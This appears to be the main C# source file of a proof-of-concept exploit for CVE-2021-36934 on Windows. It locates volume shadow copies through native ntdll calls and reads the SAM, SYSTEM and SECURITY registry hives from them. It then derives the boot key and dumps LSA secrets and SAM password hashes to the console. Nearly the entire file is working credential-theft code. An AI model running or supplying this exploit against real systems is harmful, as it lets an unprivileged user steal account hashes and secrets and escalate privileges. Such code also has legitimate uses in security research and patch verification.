using CVE_2021_36934.HiveParser;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;
using static CVE_2021_36934.HiveParser.Registry;

namespace CVE_2021_36934
{
    internal class Program
    {
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Int32 _wfopen_s(out IntPtr pFile, String filename, String mode);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        public static extern Int32 fclose(IntPtr stream);

        [DllImport("ntdll.dll")]
        public static extern int NtOpenDirectoryObject(
            out SafeFileHandle DirectoryHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll")]
        public static extern int NtQueryDirectoryObject(
            SafeFileHandle DirectoryHandle,
            IntPtr Buffer,
            int Length,
            bool ReturnSingleEntry,
            bool RestartScan,
            ref uint Context,
            out uint ReturnLength);


        private static void Main(string[] args)
        {
            var reader = new FileReader();
            List<string> volumes = FindShadowVolumes();
            foreach (string volume in volumes)
            {
                string path = @"\\?\GLOBALROOT\Device\" + volume + @"\Windows\system32\config";
                string sam = path + "\\sam";
                string system = path + "\\system";
                string security = path + "\\security";
                if (CheckFile(sam))
                {
                    Console.WriteLine($"[*] SAM: {sam}");
                    Console.WriteLine($"[*] SYSTEM: {system}");
                    Console.WriteLine($"[*] SECURITY: {security}");

                    //Need to read GLOBALROOT from unmanaged code
                    byte[] samBytes = reader.Read(sam);
                    byte[] systemBytes = reader.Read(system);
                    byte[] securityBytes = reader.Read(security);

                    ParseSecrets(samBytes, systemBytes, securityBytes);
                }
            }
        }

        //Returns true if file is readable
        public static bool CheckFile(string path)
        {
            IntPtr file;
            if (_wfopen_s(out file, path, "r") == 0)
            {
                fclose(file);
                return true;
            }
            else
            {
                return false;
            }
        }

        public static List<string> FindShadowVolumes()
        {
            List<string> list = new List<string>();

            SafeFileHandle h;
            var attr = new OBJECT_ATTRIBUTES("\\Device", 0);
            var st = NtOpenDirectoryObject(out h, 1, ref attr);
            if (st < 0)
                return list;

            var bufsz = 1024;
            var buf = Marshal.AllocHGlobal(bufsz);
            uint context = 0, len;
            for (; ; )
            {
                st = NtQueryDirectoryObject(h, buf, bufsz, true, context == 0, ref context, out len);
                if (st < 0) break;

                OBJECT_DIRECTORY_INFORMATION odi = (OBJECT_DIRECTORY_INFORMATION)Marshal.PtrToStructure(buf, typeof(OBJECT_DIRECTORY_INFORMATION));
                if (odi.TypeName.ToString() == "Device" && odi.Name.ToString().Contains("VolumeShadowCopy"))
                {
                    //Console.WriteLine(odi.Name);
                    list.Add(odi.Name.ToString());
                }
            }
            Marshal.FreeHGlobal(buf);
            h.Dispose();

            return list;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_DIRECTORY_INFORMATION
        {
            public UNICODE_STRING Name;
            public UNICODE_STRING TypeName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                        objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }


        public static void ParseSecrets(byte[] samBytes, byte[] systemBytes, byte[] securityBytes)
        {
            StringBuilder sb = new StringBuilder();
            byte[] bootKey = new byte[16];

            using (BinaryReader systemReader = new BinaryReader(new MemoryStream(systemBytes)))
            {
                RegistryHive system = new RegistryHive(systemReader);
                bootKey = GetBootKey(system);
                if (bootKey == null)
                {
                    Console.WriteLine("[-] Failed to parse bootkey");
                    return;
                }
                using (BinaryReader securityReader = new BinaryReader(new MemoryStream(securityBytes)))
                {
                    RegistryHive security = new RegistryHive(securityReader);
                    ParseLsa(security, bootKey, system).ForEach(item => sb.Append(item + Environment.NewLine));
                }
            }

            using (BinaryReader samReader = new BinaryReader(new MemoryStream(samBytes)))
            {
                RegistryHive sam = new RegistryHive(samReader);
                ParseSam(bootKey, sam).ForEach(item => sb.Append(item + Environment.NewLine));
            }


            Console.WriteLine(sb.ToString());
        }
    }
}